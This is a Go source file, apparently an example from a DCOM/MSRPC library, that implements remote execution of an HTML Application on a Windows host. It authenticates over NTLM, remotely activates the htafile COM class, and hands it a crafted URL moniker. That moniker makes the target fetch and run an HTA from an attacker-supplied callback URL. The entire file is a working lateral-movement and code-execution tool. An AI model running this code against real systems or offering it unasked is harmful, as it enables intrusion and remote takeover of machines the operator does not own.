//go:build exclude

// Script to execute HTA file (HTML application) on a remote machine.

package main

import (
	"context"
	"encoding/binary"
	"errors"
	"flag"
	"fmt"
	"net"
	"os"

	"github.com/oiweiwei/go-msrpc/dcerpc"
	"github.com/oiweiwei/go-msrpc/midl/uuid"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon/imoniker/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/urlmon/ipersistmoniker/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dtyp"
	"github.com/oiweiwei/go-msrpc/ndr"
	"github.com/oiweiwei/go-msrpc/text/encoding/utf16le"

	"github.com/oiweiwei/go-msrpc/msrpc/dcom"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iactivation/v0"
	"github.com/oiweiwei/go-msrpc/msrpc/dcom/iobjectexporter/v0"

	"github.com/oiweiwei/go-msrpc/ssp"
	"github.com/oiweiwei/go-msrpc/ssp/credential"
	"github.com/oiweiwei/go-msrpc/ssp/gssapi"

	"github.com/oiweiwei/go-msrpc/msrpc/erref/hresult"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/win32"
	_ "github.com/oiweiwei/go-msrpc/msrpc/erref/wmi"
)

const (
	UriCreateAllowRelative               uint32 = 0x00000001
	UriCreateAllowImplicitWildcardScheme uint32 = 0x00000002
	UriCreateAllowImplicitFileScheme     uint32 = 0x00000004
	UriCreateNoFrag                      uint32 = 0x00000008
	UriCreateNoCanonicalize              uint32 = 0x00000010
	UriCreateFileUseDosPath              uint32 = 0x00000020
	UriCreateDecodeExtraInfo             uint32 = 0x00000040
	UriCreateNoDecodeExtraInfo           uint32 = 0x00000080
	UriCreateCanonicalize                uint32 = 0x00000100
	UriCreateCrackUnknownSchemes         uint32 = 0x00000200
	UriCreateNoCrackUnknownSchemes       uint32 = 0x00000400
	UriCreatePreProcessHTMLURI           uint32 = 0x00000800
	UriCreateNoPreProcessHTMLURI         uint32 = 0x00001000
	UriCreateIESettings                  uint32 = 0x00002000
	UriCreateNoIESettings                uint32 = 0x00004000
	UriCreateNoEncodeForbiddenChars      uint32 = 0x00008000
	UriCreateNormalizeIntlChars          uint32 = 0x00010000
)

var (
	callback string
	target   string

	serialGUID        = dtyp.GUIDFromUUID(uuid.MustParse("F4815879-1D3B-487F-AF2C-825DC4852763"))
	htafileClassID    = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("3050F4D8-98B5-11CF-BB82-00AA00BDCE0B")))
	urlMonikerClassID = (*dcom.ClassID)(dtyp.GUIDFromUUID(uuid.MustParse("79EAC9E0-BAF9-11CE-8C82-00AA004BA90B")))
)

func init() {
	// add credentials.
	gssapi.AddCredential(credential.NewFromPassword(os.Getenv("USERNAME"), os.Getenv("PASSWORD")))
	// add mechanism.
	gssapi.AddMechanism(ssp.SPNEGO)
	gssapi.AddMechanism(ssp.NTLM)

	flag.StringVar(&callback, "url", "", "callback url")
	flag.StringVar(&target, "server", os.Getenv("SERVER_NAME"), "server name")
	flag.Parse()
}

func main() {
	if callback == "" {
		fmt.Fprintln(os.Stderr, "callback url (-url) is required")
		flag.Usage()
		os.Exit(1)
	}
	if target == "" {
		fmt.Fprintln(os.Stderr, "target server (-server) is required")
		flag.Usage()
		os.Exit(1)
	}

	ctx := gssapi.NewSecurityContext(context.Background())

	// ObjectExporter uses well-known endpoint 135.
	cc, err := dcerpc.Dial(ctx, net.JoinHostPort(target, "135"))
	if err != nil {
		panic(err)
	}
	defer func() {
		if cc != nil {
			cc.Close(ctx)
		}
	}()

	// Create an object exporter client.
	cli, err := iobjectexporter.NewObjectExporterClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(target))
	if err != nil {
		panic(err)
	}
	// Call ServerAlive2 to determine the bindings & COM version.
	srv, err := cli.ServerAlive2(ctx, &iobjectexporter.ServerAlive2Request{})
	if err != nil {
		panic(err)
	}
	// Create an activation client.
	iact, err := iactivation.NewActivationClient(ctx, cc, dcerpc.WithSign(), dcerpc.WithTargetName(target))
	if err != nil {
		panic(err)
	}

	// Perform remote activation.
	act, err := iact.RemoteActivation(ctx, &iactivation.RemoteActivationRequest{
		ORPCThis: &dcom.ORPCThis{Version: srv.COMVersion},
		ClassID:  htafileClassID.GUID(),
		IIDs:     []*dcom.IID{ipersistmoniker.PersistMonikerIID},
		// for TCP/IP it must be []uint16{7} / for named pipes: []uint16{15}.
		RequestedProtocolSequences: []uint16{7, 15},
	})
	if err != nil {
		panic(err)
	}
	if act.HResult != 0 {
		fmt.Fprintln(os.Stderr, hresult.FromCode(uint32(act.HResult)))
		os.Exit(1)
	}
	if err != nil {
		panic(err)
	}
	ipid := act.InterfaceData[0].GetStandardObjectReference().Std.IPID // Activated instance ID

	// Dial activated instance
	cc, err = dcerpc.Dial(ctx, target,
		append(act.OXIDBindings.EndpointsByProtocol("ncacn_ip_tcp"), dcerpc.WithSign(), dcom.WithIPID(ipid))...)
	if err != nil {
		panic(err)
	}
	// Create IPersistMoniker client.
	ipmc, err := ipersistmoniker.NewPersistMonikerClient(ctx, cc, dcom.WithIPID(ipid))
	if err != nil {
		panic(err)
	}
	// Craft wrapped URL Moniker
	mon, err := getUrlMoniker(callback, UriCreateCanonicalize|UriCreateCrackUnknownSchemes)
	if err != nil {
		panic(err)
	}
	// Load crafted URL Moniker
	lrs, err := ipmc.Load(ctx, &ipersistmoniker.LoadRequest{
		This: &dcom.ORPCThis{Version: srv.COMVersion},
		Name: mon,
	})
	if err != nil {
		// Example of how to handle URL Moniker related errors.
		if errors.Is(err, hresult.InetEInvalidUrl) {
			fmt.Fprintln(os.Stderr, "Server reported invalid URL:", callback)
		}
	}
	_ = lrs
}

// URLMoniker represents the relevant fields of a URL Moniker.
// See https://learn.microsoft.com/en-us/openspecs/office_file_formats/ms-oshared/4948a119-c4e4-46b6-9609-0525118552e8
type URLMoniker struct {
	URL           string
	HasExtras     bool   // whether to include trailer with SerialGUID/SerialVersion/URIFlags on marshal
	SerialVersion uint32 // should be 0 when HasExtras; preserved on unmarshal
	URIFlags      uint32 // the URICreateFlags bitmask (meaning per CreateUri)
}

// MarshalBinary implements encoding.BinaryMarshaler.
func (m URLMoniker) MarshalBinary() ([]byte, error) {
	// UTF-16LE encode URL + terminating NUL.
	urlBytes, err := utf16le.Encode(m.URL + "\x00")
	if err != nil {
		return nil, err
	}
	var out []byte
	if m.HasExtras {
		out = make([]byte, 4+len(urlBytes)+16+4+4)
		copy(out[4+len(urlBytes):], serialGUID.UUID().EncodeBinary())
		binary.LittleEndian.PutUint32(out[4+len(urlBytes)+16:], m.SerialVersion)
		binary.LittleEndian.PutUint32(out[4+len(urlBytes)+16+4:], m.URIFlags)
	} else {
		out = make([]byte, 4+len(urlBytes))
	}
	binary.LittleEndian.PutUint32(out, uint32(len(out)-4))
	copy(out[4:], urlBytes)

	return out, nil
}

// getUrlMoniker returns a wrapped URL Moniker for the given URL string.
func getUrlMoniker(url string, flags uint32) (*urlmon.Moniker, error) {
	blob, err := URLMoniker{URL: url, HasExtras: true, URIFlags: flags}.MarshalBinary()
	if err != nil {
		return nil, err
	}
	objRef := &dcom.ObjectReference{
		Signature: ([]byte)(dcom.ObjectReferenceCustomSignature),
		Flags:     dcom.ObjectReferenceTypeCustom,
		IID:       imoniker.MonikerIID,
		ObjectReference: &dcom.ObjectReference_ObjectReference{
			Value: &dcom.ObjectReference_Custom{
				Custom: &dcom.ObjectReferenceCustom{
					ClassID:    urlMonikerClassID,
					Size:       uint32(len(blob)),
					ObjectData: blob,
				},
			},
		},
	}
	dat, err := ndr.Marshal(objRef, ndr.Opaque)
	if err != nil {
		return nil, err
	}
	return &urlmon.Moniker{Data: dat}, nil
}
